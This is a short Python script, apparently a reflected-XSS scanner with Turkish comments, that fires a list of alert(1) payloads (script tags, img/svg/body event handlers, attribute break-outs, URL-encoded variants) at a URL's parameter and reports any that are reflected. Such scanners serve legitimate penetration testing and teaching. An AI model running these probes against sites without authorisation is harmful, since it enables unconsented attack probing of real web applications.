#!/usr/bin/env python3
"""
Advanced XSS Scanner
====================
Tests URL parameters for reflected XSS using multiple payloads.
"""
import requests
import sys
import urllib.parse
import concurrent.futures

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "'><svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    "<body onload=alert(1)>",
    "\"><body onload=alert(1)>",
    "'><body onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
]

def check_payload(url, payload):
    try:
        # payload'u son parametreye ekle veya değiştir (Basit yaklaşım)
        if "?" in url:
            test_url = f"{url}{urllib.parse.quote(payload)}"
        else:
            test_url = f"{url}?q={urllib.parse.quote(payload)}"

        res = requests.get(test_url, timeout=5)
        
        if payload in res.text:
             return True, test_url, payload
             
    except requests.RequestException:
        pass
    return False, None, payload

def test_xss(url):
    print(f"[*] XSS Test ediliyor: {url}")
    print(f"[*] Toplam Payload: {len(PAYLOADS)}\n")
    
    found = False
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_payload, url, payload): payload for payload in PAYLOADS}
        
        for future in concurrent.futures.as_completed(futures):
             success, test_url, payload = future.result()
             if success:
                 print(f"[!] Olası Reflected XSS Bulundu!")
                 print(f"  [+] Payload: {payload}")
                 print(f"  [+] URL: {test_url}")
                 found = True

    if not found:
        print("\n[-] XSS zafiyeti tespit edilemedi.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python XSS_Scanner.py <URL>")
        print("Örnek: python XSS_Scanner.py \"http://example.com/search?q=\"")
        sys.exit(1)
    test_xss(sys.argv[1])
